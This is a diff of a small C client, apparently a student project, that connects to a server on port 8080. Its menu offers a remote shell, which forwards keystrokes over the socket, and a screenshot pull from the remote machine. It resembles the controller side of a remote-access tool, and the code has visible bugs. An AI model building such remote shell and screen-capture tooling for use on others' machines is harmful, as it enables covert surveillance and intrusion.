@@ -1,13 +1,7 @@
-//SCREENSHOT
-#include <cairo.h>
-#include <cairo-xlib.h>
-#include <X11/Xlib.h>
-
 //FILE
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-
 //NETWORK
 #include<sys/socket.h>
 #include<arpa/inet.h>
@@ -24,98 +18,17 @@ extern int h_errno;
 #define BUF_SIZE 255
 
 
-
-void display(FILE *file) {
-    if ( fork() == 0) {
-        int size = 255;
-        char buf[size];
-        while(1) {
-            fgets(buf, size, file);
-            printf("%s",buf);
-        }
-    }
-}
-
 char* read_input() {
-    int size = 255;
-    char* in =  malloc(sizeof(char) * 255);
-    if (fgets(in, size, stdin) == NULL) {
+    char* in =  malloc(sizeof(char) * BUF_SIZE);
+    if (fgets(in, BUF_SIZE, stdin) == NULL) {
         exit(1);
     }
-    printf("%s",in);
+    //printf("%s",in);
     return in;
 }
 
-
-void handle_shell(FILE* f) {
-    printf("ON est ici\n");
-    while(1) {
-        fprintf(f,"%s",read_input());
-    }
-}
-
-
-void interact(int socket) {
-
-    FILE* file = fdopen(socket, "w");
-    FILE* f    = fdopen(socket, "r");
-    display(f); 
-    char *input = "1";
-    fprintf(file, "%s", input);
-    
-    int choix = 0; 
-
-    while ( choix == 0) {
-        
-        int i;
-
-        for( i = 0; i < 3; i++) {
-            if ( strchr(input, i + '0') != NULL) {
-                choix = i;
-            }
-        }
-    }
-//    free(input); 
-
-    switch(choix) {
-    
-        case 1 : handle_shell(file);
-        break;
-    
-    }
-}
-
-
-
-int connect_to_server(char *hostname){
-	int socket_desc;
-	struct sockaddr_in server;
-
-	//Create socket
-	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
-	if (socket_desc == -1)
-	{
-		printf("Could not create socket");
-	}
-	struct hostent *he = gethostbyname(hostname);	
-	memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);	
-	server.sin_family = AF_INET;
-	server.sin_port = htons(8080);
-
-	//Connect to remote server
-	if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
-	{
-		perror("connect error");
-		return 1;
-	}
-
-	printf("Connected\n");
-	return socket_desc;
-}
-
-int get_screenshot(int fd, char *host)
+int get_screenshot(int fd, int socket_desc)
 {
-	int socket_desc = connect_to_server(host);
 	
 	char buffer[BUF_SIZE];
 	int n = 0;
@@ -131,13 +44,87 @@ int get_screenshot(int fd, char *host)
 }
 
 
+
+void handle_shell(int socket) {
+    while(1) {
+    	char car;
+    	read(0, &car, sizeof(char));
+    	write(socket, &car, sizeof(char));
+    }
+
+}
+
+
+void interact(int socket) {
+
+    printf("---MENU---\n1: SHELL\n2: SCREENSHOT\n---FIN---\n");
+    char *input = read_input();
+    
+    int choix = 0; 
+
+    while ( choix == 0) {
+        
+        int i;
+
+        for( i = 0; i < 3; i++) {
+            if ( strchr(input, i + '0') != NULL) {
+                choix = i;
+            }
+        }
+    }
+    free(input); 
+
+   write(socket, &choix, sizeof(int)); 
+    switch(choix) {
+    
+        case 1 : handle_shell(socket);
+        break;
+    	case 2: 
+		int fd;
+		fd = open("screenshot.png", O_CREAT | O_WRONLY | O_RDONLY);
+		if(fd < 0){
+			perror("file :");
+			exit(1);
+		}
+		get_screenshot(fd, socket);
+	break;
+    }
+}
+
+
+
+int connect_to_server(char *hostname){
+	int socket_desc;
+	struct sockaddr_in server;
+
+	//Create socket
+	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
+	if (socket_desc == -1)
+	{
+		printf("Could not create socket");
+		exit(1);
+	}
+	struct hostent *he = gethostbyname(hostname);	
+	memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);	
+	server.sin_family = AF_INET;
+	server.sin_port = htons(8080);
+
+	//Connect to remote server
+	if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
+	{
+		perror("connect error");
+		exit(1);
+	}
+	printf("Connected\n");
+	return socket_desc;
+}
+
 int main(int argc, char **argv) {
 	char *host;
 	if(argc > 1)
 		host = argv[1];
 	else
-		host = "bouleau02";
+		host = "localhost";
         interact(connect_to_server(host));   
-//	get_screenshot(open("screenshot.png", O_CREAT | O_WRONLY | O_RDONLY), host);
 	return 0;
 }
